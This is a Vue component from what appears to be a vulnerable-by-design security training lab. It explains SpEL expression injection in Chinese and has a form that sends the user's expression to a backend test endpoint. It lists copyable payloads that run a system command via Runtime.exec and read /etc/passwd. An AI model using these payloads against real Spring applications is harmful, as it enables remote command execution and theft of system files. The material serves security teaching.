<template>
  <vuln-template
    title="SpEL表达式注入"
    subtitle="Spring Expression Language"
    level="高危"
    :icon="CodeOutlined"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>SpEL (Spring Expression Language)</strong> 是Spring框架的表达式语言,用于在运行时查询和操作对象。
      </a-typography-paragraph>
      <a-typography-paragraph>
        SpEL注入漏洞的危害：
      </a-typography-paragraph>
      <ul>
        <li>执行任意Java代码</li>
        <li>远程命令执行</li>
        <li>读取敏感文件</li>
        <li>完全控制应用程序</li>
      </ul>
      <a-typography-paragraph>
        当应用程序将用户输入直接用于SpEL表达式时,就可能产生注入漏洞。
      </a-typography-paragraph>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的SpEL注入payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        T(java.lang.Runtime).getRuntime().exec('whoami')
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">执行系统命令</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">
        T(java.lang.System).getProperty('user.dir')
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">获取系统属性</span>
      </a-space>

      <a-typography-paragraph code copyable style="margin-top: 12px">
        new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">读取文件内容</span>
      </a-space>

      <a-alert
        message="避免将用户输入直接用于SpEL表达式！"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <a-form :model="formState" @finish="handleSubmit" layout="vertical">
        <a-form-item
          label="输入SpEL表达式"
          name="exp"
          :rules="[{ required: true, message: '请输入内容' }]"
        >
          <a-input
            v-model:value="formState.exp"
            size="large"
            placeholder="请输入测试内容"
          />
        </a-form-item>

        <a-form-item>
          <a-space>
            <a-button type="primary" html-type="submit" size="large" :loading="loading">
              <template #icon><play-circle-outlined /></template>
              执行测试
            </a-button>
            <a-button size="large" @click="handleReset">
              <template #icon><redo-outlined /></template>
              重置
            </a-button>
          </a-space>
        </a-form-item>
      </a-form>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { CodeOutlined, PlayCircleOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const formState = reactive({
  exp: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/spel', {
      params: { exp: formState.exp }
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.exp = ''
  result.value = ''
}
</script>
